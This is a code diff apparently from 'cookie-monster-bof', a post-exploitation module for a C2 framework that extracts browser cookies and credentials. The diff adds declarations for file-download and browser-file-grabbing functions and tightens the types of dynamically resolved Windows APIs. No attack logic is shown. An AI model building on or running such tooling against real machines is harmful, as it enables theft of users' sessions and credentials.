@@ -6,6 +6,10 @@
 #include "cookie-monster-bof.h"
 #include "adaptix.h"
 
+// Function declarations
+BOOL download_file(IN LPCSTR fileName, IN char fileData[], IN ULONG32 fileLength);
+BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR * folderPath);
+
 WINBASEAPI DWORD   WINAPI KERNEL32$GetLastError (VOID);
 WINBASEAPI HANDLE  WINAPI KERNEL32$CreateFileA (LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
 WINBASEAPI BOOL WINAPI KERNEL32$WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
@@ -67,8 +71,8 @@ DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptDecrypt (NCRYPT_KEY_HANDLE h
 DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptOpenKey (NCRYPT_PROV_HANDLE hProvider, NCRYPT_KEY_HANDLE *phKey, LPCWSTR pszKeyName, DWORD dwLegacyKeySpec, DWORD dwFlags);
 DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptOpenStorageProvider (NCRYPT_PROV_HANDLE *phProvider, LPCWSTR pszProviderName, DWORD dwFlags);
 
-#define IMPORT_RESOLVE FARPROC SHGetFolderPath = Resolver("shell32", "SHGetFolderPathA"); \
-    FARPROC PathAppend = Resolver("shlwapi", "PathAppendA"); \
+#define IMPORT_RESOLVE PFN_SHGetFolderPathA SHGetFolderPath = (PFN_SHGetFolderPathA)Resolver("shell32", "SHGetFolderPathA"); \
+    PFN_PathAppendA PathAppend = (PFN_PathAppendA)Resolver("shlwapi", "PathAppendA"); \
     FARPROC srand = Resolver("msvcrt", "srand");\
     FARPROC time = Resolver("msvcrt", "time");\
     FARPROC strnlen = Resolver("msvcrt", "strnlen");\
